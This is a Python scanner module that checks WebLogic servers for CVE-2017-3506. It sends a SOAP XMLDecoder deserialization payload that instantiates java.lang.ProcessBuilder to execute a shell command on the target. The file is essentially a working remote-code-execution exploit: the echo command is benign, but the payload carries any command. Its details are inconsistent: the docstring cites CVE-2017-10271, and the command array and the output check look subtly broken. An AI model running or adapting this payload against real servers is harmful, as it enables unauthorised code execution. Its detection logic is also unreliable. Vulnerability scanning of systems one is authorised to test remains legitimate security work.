#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/10/12 2:38 下午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : CVE_2017_3506_weblogic.py
# @Software: PyCharm


import requests
import time



class run(object):
    def __init__(self):
        self.name = "CVE_2017_3506_weblogic"

    def runCheck(self, targetAddr, payload):
        """
        检测weblogic反序列化漏洞cve_2017_10271
        :param targetAddr:
        :param payload:
        :return:
        """
        currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        headers = {'Content-Type': 'text/xml'}

        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr

        if payload == 'CVE_2017_3506_weblogic':
            payload01 = r'/wls-wsat/CoordinatorPortType'
        else:
            data = '您的输入有误,请重新输入!'
            return {'status': 20001, 'data': data, 'type': 'status'}

        url = targetAddr + payload01

        data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0"><string>echo UjFhbmRyMG9wCg== | base64</string></void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>'''

        try:
            res = requests.post(url, data=data, verify=False, timeout=5, headers=headers)
            if 'VWpGaGJtUnlNRzl3Q2c9PQo=' in res.text:
                status_data = '[+]{} is vulnerable! {}'.format(targetAddr, currentTime)

                return {'status': 20003, 'data': status_data, 'type': 'status'}
            else:
                status_data = '[-]{} is unvulnerable! {}'.format(targetAddr, currentTime)
                return {'status': 20004, 'data': status_data, 'type': 'status'}

        except requests.exceptions.RequestException as e:
            status_data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
            return {'status': 20002, 'data': status_data, 'type': 'status'}